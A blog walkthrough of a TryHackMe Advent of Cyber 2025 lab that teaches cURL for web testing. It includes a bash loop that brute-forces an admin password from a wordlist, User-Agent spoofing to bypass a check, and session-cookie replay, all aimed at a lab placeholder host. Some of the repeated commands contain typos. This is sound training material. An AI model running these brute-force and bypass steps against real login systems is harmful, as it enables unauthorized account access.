---
title: "Exploitation with cURL - Hoperation Eggsploit (TryHackMe) 🧑‍🎄🎉"
datePublished: Mon Dec 29 2025 21:05:54 GMT+0000 (Coordinated Universal Time)
cuid: cmjrne77p000902l86boagbal
slug: exploitation-with-curl-hoperation-eggsploit-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1767042266204/2b3f2e03-bd35-4a3f-b5c4-191ac7cfe4e9.png
tags: curl, pentesting, exploit, tryhackme, adventofcyber2025

---

After twenty-three days of exploits, investigations, and saving Wareville from disaster, Advent of Cyber reaches its final challenge. There are no flashy tools left. No browser. No Burp Suite. Just a terminal, raw HTTP, and the skills we’ve built throughout the season.

Blue-team intelligence reveals that the Evil Bunnies’ wormhole is being kept open by a web control panel on their server. If it isn’t shut down, King Malhare’s reinforcements will keep pouring in. The problem? We can’t rely on graphical interfaces this time. We must communicate with the server the way computers actually do — through HTTP requests sent directly from the command line.

This final task brings everything full circle. From understanding how web applications communicate, to managing sessions, handling authentication, brute forcing weak credentials, and bypassing basic security checks, we rely on fundamentals rather than tools. Using cURL, we strip web hacking down to its core and prove that with enough understanding, even a “bare” terminal is more than enough to get the job done.

Day 24 isn’t about learning something new — it’s about **proving how far we’ve come**.

## Introduction

**The Story**

![Task banner for day 24](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1764153637405.png align="left")

According to blue-team intel, the wormhole is held open by a control panel on the Evil Bunnies' web server. The team must shut it down first to cut off reinforcements before facing King Malhare.

However, the terminal they have is bare. No Burp Suite, no browser, just a command prompt.

But that's fine. The team will use the command line and cURL to speak HTTP directly: send requests, read responses, and find the endpoints that shut the portal.

## **Learning Objectives**

* Understand what HTTP requests and responses are at a high level.
    
* Use cURL to make basic requests (using GET) and view raw responses in the terminal.
    
* Send POST requests with cURL to submit data to endpoints.
    
* Work with cookies and sessions in cURL to maintain login state across requests.
    

## Web Hacking Using cURL

## **HTTP Requests Using cURL**

Applications, like our browsers, communicate with servers using HTTP (Hypertext Transfer Protocol). Think of HTTP as the language for asking a server for resources (pages, images, JSON data) and getting answers back.

So if you want to access a website, your browser sends an **HTTP request** to the web server. If the request is valid, the server replies with an **HTTP response** that contains the data needed to display the website.

In the absence of a browser, you can still speak HTTP directly from the command line. The simplest way is with cURL.

`curl` is a command-line tool for crafting HTTP requests and viewing raw responses. It's ideal when you need precision or when GUI tools aren't available.

## **Trying out cURL**

Once you have AttackBox ready. Open a command prompt and run the command below:

AttackBox Terminal

```bash
root@attackbox:~# curl http://MACHINE_IP/
```

What happens after running the command is that `curl` sends an `HTTP GET` request for the site's home page. An HTTP response is received containing the body, which is then printed in the terminal. Because this is a terminal, instead of rendering the webpage, what you'll see is the text representation of the page in HTML.

## **Sending POST Requests**

Suppose you've found a login form whose **POST** target is `/post.php`. When you log in through a browser, it sends a **POST** request to the server containing the credentials you entered. We can simulate this directly from the terminal.

A normal login form submission might look like this:

AttackBox Terminal

```bash
root@attackbox:~# curl -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

You should get the reply `Invalid credentials`.

Here's what's happening:

* `-X POST` tells cURL to use the POST method.
    
* `-d` defines the data we're sending in the body of the request.
    
* The data will be sent in URL-encoded format, which is the same as what HTML forms use.
    

If the application expects additional fields, like a "Login" button or a CSRF token, they can be included too:

AttackBox Terminal

```bash
root@attackbox:~# curl -X POST -d "username=user&password=user&submit=Login" http://MACHINE_IP/post.php
```

To view exactly what the server returns (including headers and potential redirects), add the `-i` flag:

AttackBox Terminal

```bash
root@attackbox:~# curl -i -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

If the site responds with a **Set-Cookie** header, that's a good sign, it means you've successfully logged in or at least triggered a session.

## **Using Cookies and Sessions**

Once you log in, web applications use cookies to keep your session active. When you make another request with your browser, the cookie gets sent automatically, but with cURL, you need to handle it yourself.

You can do this in two steps:

**Step 1: Save the cookies**

Terminal

```bash
root@attackbox:~# curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php
```

* The `-c` option writes any cookies received from the server into a file (`cookies.txt` in this case).
    
* You'll often see a session cookie like `PHPSESSID=xyz123`.
    

**Step 2: Reuse the saved cookies**

Terminal

```bash
root@attackbox:~# curl -b cookies.txt http://MACHINE_IP/session.php
```

* The `-b` option tells cURL to send the saved cookies in the next request, just like a browser would.
    

This is exactly how session replay testing works, by replaying valid cookies in separate requests.

## **Automating Login and Performing Brute Force Using cURL**

Now that we can send POST requests and manage sessions, it's time to automate things. Let's simulate a brute-force attack against a weak login form.

Start by creating a file called `passwords.txt` and place the following passwords inside it:

```text
admin123
password
letmein
secretpass
secret
```

Then, create a simple bash loop called [`loop.sh`](http://loop.sh) to try each password against `bruteforce.php` and copy-paste the following code inside it:

```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

Then add the execute permission to the script and run it, as shown below:

AttackBox Terminal

```bash
root@attackbox:~# chmod +x loop.sh
root@attackbox:~# ./loop.sh
```

Here's how this works:

* `$(cat passwords.txt)` reads each password from the file.
    
* `curl -s` sends the login request silently (no progress meter).
    
* The response is stored in a variable.
    
* `grep -q` checks if the response contains a success string (like “Welcome”).
    
* When found, it prints the working password and exits the loop.
    

This exact method underpins tools like **Hydra**, **Burp Intruder**, and **WFuzz**. By doing it manually, you understand what's happening under the hood: a repetitive HTTP POST with variable data, waiting for a different response.

## **Bypassing User-Agent Checks**

Some applications block cURL by checking the **User-Agent** header. For example, the server may reject requests with: `User-Agent: curl/7.x.x`

To specify a custom user-agent, we can use the `-A` flag:

Terminal

```bash
root@attackbox:~# curl -A "internalcomputer" http://MACHINE_IP/ua_check.php
```

To confirm the check:

Terminal

```bash
root@attackbox:~# curl -i http://MACHINE_IP/ua_check.php
root@attackbox:~# curl -i -A "internalcomputer" http://MACHINE_IP/ua_check.php
```

If the first fails and the second succeeds, the UA check is working, and you've bypassed it by spoofing.

## **Bonus Mission**

**This section is optional and applies only to the final bonus question. The instructions in this section do not apply to the regular questions. Feel free to skip it and proceed with the regular questions if you don’t intend to attempt it.**

Before the final battle can begin, the wormhole must be closed to stop enemy reinforcements. The evil Easter bunnies operate a web control panel that holds it open. The blue team must identify endpoints, authenticate and obtain the operator token, and call the close operation.

**Hint:** Use rockyou.txt when brute forcing for the password (only for the bonus mission). The PIN is between 4000 and 5000.

**Server**: [`http://MACHINE_IP/terminal.php?action=panel`](http://MACHINE_IP/terminal.php?action=panel)

### Answer the questions below

1. Make a **POST** request to the `/post.php` endpoint with the **username** `admin` and the **password** `admin`. What is the flag you receive?  
      
    `curl http://IP_Address/`
    
    `curl -X POST -d “username=user&password=user“ http://IP_Address/post.php`
    
    `curl -x POST -d “username=user&password=user&submit=Login“ http://IP_Address/post.php`
    
    `curl -i -X POST -d “username=user&password=user“ http://IP_Address/post.php`  
    `curl -c cookies.txt -d “username=adminpassword=admin” http://IP_Address/session.php`
    
    `curl -b cookies.txt http://IP_Address/session.php`
    
    `nano passwords.txt`
    
    ```bash
    admin123
    password
    letmein
    secretpass
    secret
    ```
    
    `nano loop.sh`
    
    ```bash
    for pass in $(cat passwords.txt); do
      echo "Trying password: $pass"
      response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
      if echo "$response" | grep -q "Welcome"; then
        echo "[+] Password found: $pass"
        break
      fi
    done
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1767039629861/4db583d2-fd99-4fc3-9c30-632e20ac836b.png align="center")
    
    `chmod +x loop.sh`
    
    `./loop.sh`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1767040749451/e237ee6c-9e15-47aa-bfa4-585464f85037.jpeg align="center")
    
    `curl -A “internalcomputer” http://IP_Address/ua_check.php`  
    `curl -i http://IP_Address/ua_check.php`  
    `curl -i -A “internalcomputer” http://IP_Address/ua_check.php`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1767040778060/982802e6-9283-40ac-8472-57b5ba637964.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1767041090335/6feebcec-37c7-4e9d-8a4c-155376796553.jpeg align="center")
    
2. Make a request to the `/cookie.php` endpoint with the **username** `admin` and the **password** `admin` and save the cookie. Reuse that saved cookie at the same endpoint. What is the flag your receive?
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1767041608389/731d0a56-748e-4513-b5f2-8655cec32dc0.jpeg align="center")
    
3. After doing the brute force on the `/bruteforce.php` endpoint, what is the password of the `admin` user?  
      
    `nano passwords.txt`
    
    ```bash
    admin123
    password
    letmein
    secretpass
    secret
    ```
    
    `nano loop.sh`
    
    ```bash
    for pass in $(cat passwords.txt); do
      echo "Trying password: $pass"
      response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
      if echo "$response" | grep -q "Welcome"; then
        echo "[+] Password found: $pass"
        break
      fi
    done
    ```
    
      
    `chmod +x loop.sh`
    
    `./loop.sh`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1767041624755/0c16b39c-65df-41f0-a3f8-862fb7f81b17.jpeg align="center")
    
    1. Make a request to the `/agent.php` endpoint with the user-agent `TBFC`. What is the flag your receive?  
          
        `curl -A “internalcomputer” http://IP_Address/agent.php`  
        `curl -i http://IP_Address/agent.php`  
        `curl -i -A “internalcomputer” http://IP_Address/agent.php`  
        `curl -A “TBFC” http://IP_Address/agent.php`
        
        ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1767041644289/21d0689a-5859-4447-82b9-ed63b298fa8f.jpeg align="center")
        
4. **Bonus question**: Can you solve the Final Mission and get the flag?
    

## Conclusion

## **The Final Battle Commences** 

With the wormhole closed, King Malhare no longer had access to his reinforcements. McSkidy looked to her fellow Wareville town members. The king would only be vulnerable for a moment. The time to strike was now!  
  
“Charge!!!” McSkidy exclaimed.  
  
McSkidy and the townspeople of Wareville began unloading a barrage of snowballs on the king’s bunny battalion. They quickly returned fire with egg projectiles. The skyline became a blur of snowballs and eggs, and McSkidy used this moment of chaos to sneak into the king’s throne room.  
  
Just as McSkidy was about to gain entry, a voice stopped her.  
“Not so fast,” giggled Sir Carrotbane.  
  
He slowly approached McSkidy, who suddenly felt underprepared. Just when she thought she was out of luck, Sir Breachblocker III stepped in front of her.  
  
“Go,” he simply said.  
  
“Wh… what are you doing?” Sir Carrotbane stuttered.  
  
“What I should have done a long time ago. What’s right!” Sir Breachblocker III slammed his shield into the snow and drew his sword.  
“GO!” he shouted, turning to McSkidy.

![McSkidy in victory pose](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1766580847606.png align="left")

## **The End of the Road**

McSkidy seized the moment and ran into the king’s throne room, where she found King Malhare throwing a tantrum.  
  
“WHERE ARE MY REINFORCEMENTS?!”  
  
“They’re not coming, Malhare,” McSkidy affirmed. “It’s over. Wareville is ours. Now let’s see how you like being captive. Now!”  
  
As she shouted, two Wareville town members sprang a cage on the king.  
  
It was over. Thanks in large part to your efforts, McSkidy had been freed, and King Malhare had finally been stopped. Wareville was safe once again. The king was dethroned and sent to HopSec Prison along with his coconspirator, Sir Carrotbane. Sir Breachblocker III was pardoned for his part in stopping the king’s tyrannical plan and later became King Breachblocker.

Congratulations on finishing Advent of Cyber and saving the day! From all of us at TryHackMe, have a Merry Soc-Mas and a “Hoppy” New Year!

### Answer the questions below

I just completed Advent of Cyber 2025!

The wormhole is closed. The reinforcements are gone. And with that final command-line request, the long battle for Wareville comes to an end.

This last challenge perfectly captures the spirit of Advent of Cyber. Throughout the event, we explored phishing, malware, cloud misconfigurations, privilege escalation, web vulnerabilities, and defensive strategies — and now, on the final day, we brought it all together using nothing but HTTP fundamentals and a terminal.

By manually crafting GET and POST requests, handling cookies, automating login attempts, spoofing headers, and interacting with protected endpoints, we demonstrated a deep understanding of how web applications truly work beneath the surface. These are the same techniques used by real attackers and defenders alike — just without the safety net of graphical tools.

Advent of Cyber isn’t about memorising commands or collecting flags. It’s about building intuition, confidence, and curiosity in cybersecurity. From day one to day twenty-four, each challenge sharpened a different skill, and this final mission proved that even when the tools are gone, the knowledge remains.

Wareville is safe. King Malhare has fallen.  
And most importantly — **you’ve completed Advent of Cyber 2025**.

🎄 Congratulations, and welcome to the next level of your cybersecurity journey.